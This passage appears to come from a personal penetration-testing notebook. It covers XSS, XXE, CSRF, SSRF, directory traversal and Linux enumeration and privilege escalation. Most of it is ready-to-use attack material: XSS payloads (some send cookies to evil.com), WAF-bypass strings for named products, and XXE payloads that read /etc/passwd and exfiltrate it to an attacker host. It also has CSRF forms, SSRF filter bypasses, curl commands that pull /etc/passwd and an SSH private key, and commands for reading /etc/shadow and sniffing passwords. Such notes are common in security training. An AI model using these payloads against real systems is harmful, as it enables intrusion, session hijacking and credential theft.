&lt;ScRipT&gt;alert(1)&lt;/sCriPt&gt;
&lt;%00script&gt;alert(1)&lt;/script&gt;
&lt;script&gt;al%00ert(1)&lt;/script&gt;
--------------------------------------------------------------------
HTML tags:
&lt;img/src=x a='' onerror=alert(1)&gt;
&lt;IMG """&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;"&gt;
&lt;img src=`x`onerror=alert(1)&gt;
&lt;img src='/' onerror='alert("kalisa")'&gt;
&lt;IMG SRC=# onmouseover="alert('xxs')"&gt;
&lt;IMG SRC= onmouseover="alert('xxs')"&gt;
&lt;IMG onmouseover="alert('xxs')"&gt;
&lt;BODY ONLOAD=alert('XSS')&gt;
&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;
&lt;SCRIPT SRC=http:/evil.com/xss.js?&lt; B &gt;
"&gt;&lt;XSS&lt;test accesskey=x onclick=alert(1)//test
&lt;svg&gt;&lt;discard onbegin=alert(1)&gt;
&lt;script&gt;image = new Image(); image.src="https://evil.com/?c="+document.cookie;&lt;/script&gt;
&lt;script&gt;image = new Image(); image.src="http://"+document.cookie+"evil.com/";&lt;/script&gt;
--------------------------------------------------------------------
Other tags:
&lt;BASE HREF="javascript:alert('XSS');//"&gt;
&lt;DIV STYLE="width: expression(alert('XSS'));"&gt;
&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;
&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;
&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;
&lt;xss id=x tabindex=1 onactivate=alert(1)&gt;&lt;/xss&gt;
&lt;xss onclick="alert(1)"&gt;test&lt;/xss&gt;
&lt;xss onmousedown="alert(1)"&gt;test&lt;/xss&gt;
&lt;body onresize=alert(1)&gt;”onload=this.style.width=‘100px’&gt;
&lt;xss id=x onfocus=alert(document.cookie)tabindex=1&gt;#x’;&lt;/script&gt;
--------------------------------------------------------------------CharCode:
&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
--------------------------------------------------------------------
if the input is already in script tag:
@domain.com"&gt;user+'-alert`1`-'@domain.com
--------------------------------------------------------------------AngularJS: 




toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,11 4,116,40,49,41)
--------------------------------------------------------------------
Scriptless:
&lt;link rel=icon href="//evil?
&lt;iframe src="//evil?
&lt;iframe src="//evil?
&lt;input type=hidden type=image src="//evil?
--------------------------------------------------------------------
Unclosed Tags:
&lt;svg onload=alert(1)//
--------------------------------------------------------------------
DOM XSS:
“&gt;&lt;svg onload=alert(1)&gt;
&lt;img src=1 onerror=alert(1)&gt;
javascript:alert(document.cookie)
\“-alert(1)}//
&lt;&gt;&lt;img src=1 onerror=alert(1)&gt;
--------------------------------------------------------------------
Another case:
param=abc`;return+false});});alert`xss`;&lt;/script&gt;
abc`; Finish the string
return+false}); Finish the jQuery click function
}); Finish the jQuery ready function
alert`xss`; Here we can execute our code
&lt;/script&gt; This closes the script tag to prevent JavaScript parsing errors
--------------------------------------------------------------------
</code></pre>
<h4 id="restrictions-bypass"><a class="header" href="#restrictions-bypass">Restrictions Bypass</a></h4>
<pre><code class="language-none">--------------------------------------------------------------------
No parentheses:
&lt;script&gt;onerror=alert;throw 1&lt;/script&gt;
&lt;script&gt;throw onerror=eval,'=alert\x281\x29'&lt;/script&gt;
&lt;script&gt;'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}&lt;/script&gt;
&lt;script&gt;location='javascript:alert\x281\x29'&lt;/script&gt;
&lt;script&gt;alert`1`&lt;/script&gt;
&lt;script&gt;new Function`X${document.location.hash.substr`1`}`&lt;/script&gt;
--------------------------------------------------------------------
No parentheses and no semicolons:
&lt;script&gt;{onerror=alert}throw 1&lt;/script&gt;
&lt;script&gt;throw onerror=alert,1&lt;/script&gt;
&lt;script&gt;onerror=alert;throw 1337&lt;/script&gt;
&lt;script&gt;{onerror=alert}throw 1337&lt;/script&gt;
&lt;script&gt;throw onerror=alert,'some string',123,'haha'&lt;/script&gt;
--------------------------------------------------------------------
No parentheses and no spaces:
&lt;script&gt;Function`X${document.location.hash.substr`1`}```&lt;/script&gt;
--------------------------------------------------------------------
Angle brackets HTML encoded (in an attribute):
“onmouseover=“alert(1)
‘-alert(1)-’
--------------------------------------------------------------------
If quote is escaped:
‘}alert(1);{‘
‘}alert(1)%0A{‘
\’}alert(1);{//
--------------------------------------------------------------------
Embedded tab, newline, carriage return to break up XSS:
&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"&gt;
&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"&gt;
&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"&gt;
--------------------------------------------------------------------
Other:
&lt;svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))&gt;: base64 value which is alert(‘XSS’)
--------------------------------------------------------------------
</code></pre>
<h4 id="encoding"><a class="header" href="#encoding">Encoding</a></h4>
<pre><code class="language-none">--------------------------------------------------------------------
Unicode:
&lt;script&gt;\u0061lert(1)&lt;/script&gt;
&lt;script&gt;\u{61}lert(1)&lt;/script&gt;
&lt;script&gt;\u{0000000061}lert(1)&lt;/script&gt;
--------------------------------------------------------------------
Hex:
&lt;script&gt;eval('\x61lert(1)')&lt;/script&gt;
--------------------------------------------------------------------
HTML:
&lt;svg&gt;&lt;script&gt;&amp;#97;lert(1)&lt;/script&gt;&lt;/svg&gt;
&lt;svg&gt;&lt;script&gt;&amp;#x61;lert(1)&lt;/script&gt;&lt;/svg&gt;
&lt;svg&gt;&lt;script&gt;alert&amp;NewLine;(1)&lt;/script&gt;&lt;/svg&gt;
&lt;svg&gt;&lt;script&gt;x="&amp;quot;,alert(1)//";&lt;/script&gt;&lt;/svg&gt;
\’-alert(1)//
--------------------------------------------------------------------
URL:
&lt;a href="javascript:x='%27-alert(1)-%27';"&gt;XSS&lt;/a&gt;
--------------------------------------------------------------------
Double URL Encode:
%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
--------------------------------------------------------------------
Unicode + HTML:
&lt;svg&gt;&lt;script&gt;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x31;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x63;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x35;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x37;&amp;#x32;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x37;&amp;#x34;(1)&lt;/script&gt;&lt;/svg&gt;
--------------------------------------------------------------------
HTML + URL:
&lt;iframe src="javascript:'&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x25;&amp;#x33;&amp;#x45;'"&gt;&lt;/iframe&gt;
--------------------------------------------------------------------
</code></pre>
<h4 id="waf-bypass"><a class="header" href="#waf-bypass">WAF Bypass</a></h4>
<pre><code class="language-none">--------------------------------------------------------------------
Imperva Incapsula:
%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E
&lt;img/src="x"/onerror="[JS-F**K Payload]"&gt;
&lt;iframe/onload='this["src"]="javas&amp;Tab;cript:al"+"ert``"';&gt;&lt;img/src=q onerror='new Function`al\ert\`1\``'&gt;
--------------------------------------------------------------------WebKnight:
&lt;details ontoggle=alert(1)&gt;
&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="alert(1)"&gt;
--------------------------------------------------------------------
F5 Big IP:
&lt;body style="height:1000px" onwheel="[DATA]"&gt;
&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="[DATA]"&gt;
&lt;body style="height:1000px" onwheel="[JS-F**k Payload]"&gt;
&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="[JS-F**k Payload]"&gt;
&lt;body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)"&gt;
&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)"&gt;
--------------------------------------------------------------------Barracuda WAF:
&lt;body style="height:1000px" onwheel="alert(1)"&gt;
&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="alert(1)"&gt;
--------------------------------------------------------------------
PHP-IDS:
&lt;svg+onload=+"[DATA]"
&lt;svg+onload=+"aler%25%37%34(1)"
--------------------------------------------------------------------
Mod-Security:
&lt;a href="j[785 bytes of (&amp;NewLine;&amp;Tab;)]avascript:alert(1);"&gt;XSS&lt;/a&gt;
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
&lt;b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)&gt;
--------------------------------------------------------------------
Quick Defense:
&lt;input type="search" onsearch="aler\u0074(1)"&gt;
&lt;details ontoggle="aler\u0074(1)"&gt;
--------------------------------------------------------------------
Sucuri WAF:
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
--------------------------------------------------------------------
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h3 id="xxe"><a class="header" href="#xxe">XXE</a></h3>
<p>XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application’s processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any backend or external systems that the application itself can access.</p>
<p>In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other backend infrastructure, by leveraging the XXE vulnerability to perform server-side request forgery (SSRF) attacks.</p>
<h2 id="types-of-xxe-attacks"><a class="header" href="#types-of-xxe-attacks">types of xxe attacks</a></h2>
<hr />
<ul>
<li>retrive files</li>
<li>Exploiting XXE to perform SSRF attacks</li>
<li>Exploiting blind XXE exfiltrate data out-of-band</li>
<li>Exploiting blind XXE to retrieve data via error messages</li>
</ul>
<h2 id="exploiting-xxe-to-retrieve-files"><a class="header" href="#exploiting-xxe-to-retrieve-files">Exploiting XXE to retrieve files</a></h2>
<hr />
<p>modify the xml in 2 ways:</p>
<ul>
<li>Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.</li>
<li>Edit a data value in the XML that is returned in the application’s response, to make use of the defined external entity.</li>
</ul>
<p>For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:</p>
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;stockCheck&gt;&lt;productId&gt;381&lt;/productId&gt;&lt;/stockCheck&gt;
</code></pre>
<p>you can exploit it modifing the xml to:</p>
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;
</code></pre>
<p>This XXE payload defines an external entity <strong>&amp;xxe</strong>; whose value is the contents of the /etc/passwd file and uses the entity within the productId value.</p>
<p>note: With real-world XXE vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application’s response. To test systematically for XXE vulnerabilities, you will generally need to test each data node in the XML individually, by making use of your defined entity and seeing whether it appears within the response.</p>
<h2 id="exploiting-xxe-to-perform-ssrf-attacks"><a class="header" href="#exploiting-xxe-to-perform-ssrf-attacks">Exploiting XXE to perform SSRF attacks</a></h2>
<hr />
<p>In the following XXE example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization’s infrastructure:</p>
<pre><code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"&gt; ]&gt;
</code></pre>
<h2 id="blind-xxe-vulnerabilities"><a class="header" href="#blind-xxe-vulnerabilities">Blind XXE vulnerabilities</a></h2>
<hr />
<h3 id="exploiting-blind-xxe-to-exfiltrate-data-out-of-band"><a class="header" href="#exploiting-blind-xxe-to-exfiltrate-data-out-of-band">Exploiting blind XXE to exfiltrate data out-of-band</a></h3>
<p>Detecting a blind XXE vulnerability via out-of-band techniques is all very well, but it doesn’t actually demonstrate how the vulnerability could be exploited. What an attacker really wants to achieve is to exfiltrate sensitive data. This can be achieved via a blind XXE vulnerability, but it involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.</p>
<pre><code>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'&gt;"&gt;
%eval;
%exfiltrate;
</code></pre>
<p>The attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver. For example, the attacker might serve the malicious DTD at the following URL:</p>
<p>http://web-attacker.com/malicious.dtd</p>
<p>Finally, the attacker must submit the following XXE payload to the vulnerable application:</p>
<pre><code>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"&gt; %xxe;]&gt;
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="csrf-portswigger"><a class="header" href="#csrf-portswigger">CSRF (portswigger)</a></h1>
<hr />
<p>Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.</p>
<p>for CSRF we need:</p>
<ol>
<li>relevant action</li>
<li>cookie based session handling: Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests.</li>
<li>No unpredictable request parameters: The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess.</li>
</ol>
<p><strong>HTTP request example</strong></p>
<pre><code>POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
</code></pre>
<p><strong>attack example</strong></p>
<pre><code>&lt;html&gt;
  &lt;body&gt;
    &lt;form action="https://vulnerable-website.com/email/change" method="POST"&gt;
      &lt;input type="hidden" name="email" value="pwned@evil-user.net" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h2 id="csrf-token-bypass-example"><a class="header" href="#csrf-token-bypass-example">csrf token bypass example</a></h2>
<p><strong>some apps validate only post methods</strong></p>
<pre><code>GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
</code></pre>
<p><strong>bypass if the app depends on the token being present</strong></p>
<pre><code>POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net
</code></pre>
<p><strong>bypass if the token is not tied to the user session:</strong><br />
In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.</p>
<p><strong>CSRF token is tied to a non-session cookie</strong> In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together:</p>
<p>This situation is harder to exploit but is still vulnerable. If the web site contains any behavior that allows an attacker to set a cookie in a victim’s browser, then an attack is possible. The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim’s browser, and feed their token to the victim in their CSRF attack.</p>
<pre><code>   POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&amp;email=wiener@normal-user.com
</code></pre>
<p><strong>CSRF token is simply duplicated in a cookie</strong> some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter.</p>
<pre><code> POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&amp;email=wiener@normal-user.com
</code></pre>
<p>In this situation, the attacker can again perform a CSRF attack if the web site contains any cookie setting functionality. Here, the attacker doesn’t need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behavior to place their cookie into the victim’s browser, and feed their token to the victim in their CSRF attack.</p>
<p><strong>Referer-based defenses against CSRF</strong> easey to change the referer</p>
<pre><code> &lt;meta name="referrer" content="never"&gt;
 http://attacker-website.com/csrf-attack?vulnerable-website.com

If the application validates that the domain in the Referer starts with the expected value, then the attacker can place this as a subdomain of their own domain:

http://vulnerable-website.com.attacker-website.com/csrf-attack
</code></pre>
<p><strong>prevention</strong> . using csrf token and validation for every methods Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ssrf"><a class="header" href="#ssrf">SSRF</a></h1>
<p>Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker’s choosing.</p>
<p>In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization’s infrastructure, or to external third-party systems.</p>
<h2 id="common-attacks"><a class="header" href="#common-attacks">common attacks</a></h2>
<p><strong>SSRF attacks against the server itself</strong> . This will typically involve supplying a URL with a hostname like 127.0.0.1 or localhost For example, consider a shopping application that lets the user view whether an item is in stock in a particular store. To provide the stock information, the application must query various back-end REST APIs, dependent on the product and store in question. The function is implemented by passing the URL to the relevant back-end API endpoint via a front-end HTTP request. So when a user views the stock status for an item, their browser makes a request like this:</p>
<pre><code> POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
</code></pre>
<p>This causes the server to make a request to the specified URL, retrieve the stock status, and return this to the user.</p>
<p>In this situation, an attacker can modify the request to specify a URL local to the server itself. For example:</p>
<pre><code>POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
</code></pre>
<p>Here, the server will fetch the contents of the /admin URL and return it to the user.</p>
<p><strong>SSRF attacks against other back-end systems</strong></p>
<pre><code>POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
</code></pre>
<h2 id="circumventing-common-ssrf-defenses"><a class="header" href="#circumventing-common-ssrf-defenses">Circumventing common SSRF defenses</a></h2>
<p><strong>SSRF with blacklist-based input filters</strong> Some applications block input containing hostnames like 127.0.0.1 and localhost, or sensitive URLs like /admin. In this situation, you can often circumvent the filter using various techniques:</p>
<ul>
<li>Using an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1.</li>
<li>Registering your own domain name that resolves to 127.0.0.1. You can use spoofed.burpcollaborator.net for this purpose.</li>
<li>Obfuscating blocked strings using URL encoding or case variation.</li>
</ul>
<p><strong>SSRF with whitelist-based input filters</strong> Some applications only allow input that matches, begins with, or contains, a whitelist of permitted values. In this situation, you can sometimes circumvent the filter by exploiting inconsistencies in URL parsing.</p>
<ul>
<li>
<p>You can embed credentials in a URL before the hostname, using the @ character. For example: https://expected-host@evil-host.</p>
</li>
<li>
<p>You can use the # character to indicate a URL fragment. For example: https://evil-host#expected-host.</p>
</li>
<li>
<p>You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: https://expected-host.evil-host.</p>
</li>
<li>
<p>You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.</p>
</li>
<li>
<p>You can use combinations of these techniques together.</p>
<pre><code>Change the URL to http://username@stock.weliketoshop.net/ and observe that this is accepted, indicating that the URL parser supports embedded credentials.
Append a # to the username and observe that the URL is now rejected.
Double-URL encode the # to %2523 and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "username".
Change the URL to http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos to access the admin interface and delete the target user.
</code></pre>
</li>
</ul>
<p><strong>Bypassing SSRF filters via open redirection</strong> It is sometimes possible to circumvent any kind of filter-based defenses by exploiting an open redirection vulnerability. Provided the API used to make the back-end HTTP request supports redirections, you can construct a URL that satisfies the filter and results in a redirected request to the desired back-end target. For example, suppose the application contains an open redirection vulnerability in which the following URL:</p>
<pre><code>/product/nextProduct?currentProductId=6&amp;path=http://evil-user.net

returns a redirection to:

http://evil-user.net
</code></pre>
<p>You can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows:</p>
<pre><code>POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin
</code></pre>
<p><strong>blind ssrf</strong> Blind SSRF vulnerabilities arise when an application can be induced to issue a back-end HTTP request to a supplied URL, but the response from the back-end request is not returned in the application’s front-end response.</p>
<p>Blind SSRF is generally harder to exploit but can sometimes lead to full remote code execution on the server or other back-end components.</p>
<p>The most reliable way to detect blind SSRF vulnerabilities is using out-of-band (OAST) techniques. This involves attempting to trigger an HTTP request to an external system that you control, and monitoring for network interactions with that system.</p>
<p><strong>SSRF via the Referer header</strong></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="directory-traversal"><a class="header" href="#directory-traversal">Directory Traversal</a></h2>
<h3 id="links-11"><a class="header" href="#links-11">Links</a></h3>
<ul>
<li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Directory%20Traversal/">Payload All The Things DT</a></li>
</ul>
<h3 id="directory-traversal-basics"><a class="header" href="#directory-traversal-basics">Directory Traversal Basics</a></h3>
<pre><code>http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd



curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa



w/encoding

curl http://192.168.50.16/cgibin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd





</code></pre>
<h3 id="burp-fuzzing"><a class="header" href="#burp-fuzzing">Burp Fuzzing</a></h3>
<pre><code>
### Fuzzing for directory traversal vulnerabilities

You can alternatively use Burp Intruder to test for directory traversal vulnerabilities. This process also enables you to closely investigate any issues that Burp Scanner has identified:

1. In **Proxy &gt; HTTP history** identify a request you want to investigate.
2. Right-click the request and select **Send to Intruder**.
3. Go to the **Intruder** tab.
4. Highlight the parameter that you want to test and click **Add §** to mark it as a payload position.
5. Go to the **Payloads** tab. Under **Payload Settings [Simple list]** add a list of directory traversal fuzz strings:
    
    1. If you're using Burp Suite Professional, select the built-in **Fuzzing - [path traversal](https://portswigger.net/web-security/file-path-traversal)** wordlist.
    2. If you're using [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload), manually add a list.
6. Click **Start attack**. The attack starts running in a new dialog. Intruder sends a request for each fuzz string on the list.
7. When the attack is finished, study the responses to look for any noteworthy behavior. For example, look for responses with a longer length. These may contain data that has been returned from the requested file.
8. 
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="linux-enumeration"><a class="header" href="#linux-enumeration">Linux Enumeration</a></h2>
<p>I only transfer linpeas, if I am not able to find anything manually</p>
<h3 id="links-12"><a class="header" href="#links-12">Links</a></h3>
<ul>
<li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPeas.sh</a></li>
<li><a href="https://github.com/rebootuser/LinEnum">LinEnum</a></li>
</ul>
<h3 id="do-this"><a class="header" href="#do-this">Do this</a></h3>
<pre><code>alias ll='clear ; ls -lsaht --color=auto'
</code></pre>
<h3 id="writable-paths"><a class="header" href="#writable-paths">Writable Paths</a></h3>
<pre><code>/dev/shm/
/tmp/
/home/&lt;USER&gt;/
/var/www/html/&lt;&gt;
</code></pre>
<h3 id="alternatives-of-cat"><a class="header" href="#alternatives-of-cat">Alternatives of <code>cat</code></a></h3>
<pre><code># using grep 
grep . &lt;filename&gt; 

# print all files in current dir 
grep -R . 

# script 
while read line; do echo $line; done &lt; FILE
</code></pre>
<h3 id="path-fix"><a class="header" href="#path-fix">Path Fix</a></h3>
<pre><code>export PATH=/bin:/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:$PATH

also an option:
PATH=/bin:/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/usr/games:/tmp
</code></pre>
<h3 id="quick-wins"><a class="header" href="#quick-wins">Quick Wins</a></h3>
<pre><code>ls -la /etc/passwd # See if you can write into /etc/passwd
find / -writable -type d 2&gt;/dev/null # insecure file perms
cat /etc/crontab # crontab
uname -r # Kernel exploit
find / -perm -4000 -ls 2&gt;/dev/null
find / -perm -u=s -type f 2&gt;/dev/null # GTFO Bins now.
docker run -v /:/mnt --rm -it alpine chroot /mnt sh # Docker
sudo -l # Sudo privs on what
getcap -r / 2&gt;/dev/null # ep in end means privilege everything # GTFO Bins.
cat /etc/exports  # Check if rw and "no_root_squash" both are present  # The directory in which both are present is shareable and mountable.
env
cat .bashrc
history
watch -n 1 "ps -aux | grep pass" # grep pass in processes
sudo tcpdump -i lo -A | grep "pass" # sometimes password in here

grep "CRON" /var/log/syslog # inspecting cron logs
</code></pre>
<h3 id="manual-enumeration"><a class="header" href="#manual-enumeration">Manual Enumeration</a></h3>
<pre><code>bash -i # Interactive bash
whoami
id
cat /etc/passwd # If www user us then meaning web server is there
uname -a # Kernel Version and Arch
cat /etc/issue # Kernel Version
Sysinfo
ps aux # What's running by root?
hostname
hostnamectl
ifconfig
ip route
ip a # If connection is connected to more than 1 network
arp -a
/opt/linux_privesc/chisel # Internal running ports
netstat -a # Internal running ports
cat /var/html # Config Files
/sbin/route # Route table
ls -la passwd
cat /etc/passwd | cut -d : -f 1 # Usernames
cat /etc/shadow
cat /etc/group
cat /etc/os-release
cat .bash_history
history
grep -Hs iptables /etc/* # Firewall rules if lucky

'sudo -u#-1 /bin/bash' # !root (no root)

# Find commands
locate flag.txt
which flag.txt
find / -name flag.txt &gt;2/dev/null

find / -type f -readable  2&gt;/dev/null | egrep -v '^(/proc|/sys|/snap|/boot|/var|/run|/dev|/opt|/etc|/usr/lib|/usr/s?bin|/usr/share/)'


</code></pre>
<h3 id="search-for-text-in-files-and-"><a class="header" href="#search-for-text-in-files-and-">Search for text in files (and !)</a></h3>
<pre><code># search keyword in all files recursive
grep -iR "&lt;keyword&gt;" &lt;SEARCH-PATH&gt; --color=alwauys 2&gt;/dev/null
grep -Rnw &lt;path-to-search&gt; -ie "&lt;keyword&gt;" --color=always 2&gt;/dev/null

# grep all files not containing certain text
grep -L "TEXT_FILE_SHOULD_NOT_CONTAIN" [files | *.extension]

# print file contents without comments (#) and removes the empty lines.
grep -v "^[#;]" FILE | grep -v "^$" 
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="linux-privesc-exploitation"><a class="header" href="#linux-privesc-exploitation">Linux PrivEsc Exploitation</a></h2>
<h3 id="links-13"><a class="header" href="#links-13">Links</a></h3>
<ul>
<li><a href="https://github.com/SecWiki/linux-kernel-exploits">Linux Kernal Exploits</a></li>
<li><a href="https://gtfobins.github.io/">GTFOBins</a></li>
<li><a href="https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/">Password Loot</a></li>
<li><a href="https://blog.certcube.com/restricted-shells-escaping-techniques-2/">Escape Restricted Shells</a></li>
<li><a href="https://flast101.github.io/docker-privesc/">Docker PrivEsc</a></li>
<li><a href="https://github.com/DominicBreuker/pspy">PSPY</a></li>
</ul>
<h3 id="kernel-exploits"><a class="header" href="#kernel-exploits">Kernel Exploits</a></h3>
<pre><code># Kernel Information
uname -a 
uname -r
cat /proc/version
cat /etc/issue
</code></pre>
<h3 id="suid"><a class="header" href="#suid">SUID</a></h3>
<pre><code>find / -perm -u=s -type f 2&gt;/dev/null

or 

find / -perm /4000 2&gt;/dev/null

find / -perm /4000 -type f -exec ls -lda {} \; 2&gt;/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s\) -exec ls -l {} \; 2&gt; /dev/null
find / -perm -u=s -type f 2&gt;/dev/null
</code></pre>
<h3 id="guid-file-check"><a class="header" href="#guid-file-check">GUID file check</a></h3>
<pre><code>find / -group &lt;&gt; 2&gt;/dev/null
</code></pre>
<h3 id="cap-file-check"><a class="header" href="#cap-file-check">CAP file check</a></h3>
<pre><code># capabilities
getcap -r / 2&gt;/dev/null
</code></pre>
<h3 id="insecure-file-perm"><a class="header" href="#insecure-file-perm">Insecure File Perm</a></h3>
